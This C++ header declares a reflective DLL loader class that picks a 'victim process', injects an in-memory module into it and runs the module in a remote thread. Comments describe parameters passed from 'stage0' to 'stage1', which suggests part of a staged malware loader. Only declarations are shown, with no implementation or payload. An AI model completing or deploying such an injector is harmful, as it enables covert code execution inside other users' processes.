#pragma once

#include "Thread.hpp"
#include "Process.hpp"
#include "ArcaneLogic.hpp"
#include "DefinesMacros.hpp"
#include "SmartHandlebase.hpp"

typedef struct
{
	Byte command_line[ArcaneLogic::MAX_COMMAND_LINE*2];
	Address64 base_address;
} REFLECTIVE_PARAMS, *PREFLECTIVE_PARAMS;

namespace reflective_loader_utils
{

NO_DISCARD ProcessPtr find_victim_process();

}

class ReflectiveLoader final
{
public:
	explicit ReflectiveLoader(Pid pid, const ProcessAccess access_rights, const ByteVector& module_bytes, const std::wstring& command_line);

	explicit ReflectiveLoader(const ByteVector& module_bytes, const std::wstring& command_line);

	~ReflectiveLoader();

	ReflectiveLoader(ReflectiveLoader const&) = delete;
	ReflectiveLoader(ReflectiveLoader&&) = delete;
	ReflectiveLoader operator=(ReflectiveLoader const&) = delete;
	ReflectiveLoader operator=(ReflectiveLoader&&) = delete;

	void inject_module();

	void run_module_in_victim();

private:
	// Walk on export dir and find the only exported function (besides dllmain, when testing this one is always first), this will be the DLL's LPTHREAD_START_ROUTINE "real" entrypoint for our purpose
	// TODO: add a gtest for this edge case and check if it is always first
	NO_DISCARD static Address64 get_entrypoint_from_exports(const ByteVector& module_to_inject);

	NO_DISCARD static PREFLECTIVE_PARAMS initialize_params(const std::wstring& command_line);

	ProcessPtr m_victim_process; // The process we inject the module to.

	ByteVector m_module_to_inject; // The memory module to inject.

	Address64 m_entrypoint_rva; // Offset in module_to_inject of the entrypoint.

	Address64 m_remote_address; // Address in victim process.

	ThreadPtr m_thread; // Injected module remote thread.

	std::wstring m_command_line; // Command line from stage0, passed onto to stage1 as param.

	PREFLECTIVE_PARAMS m_param; // Struct of params passed onto the next stage.
};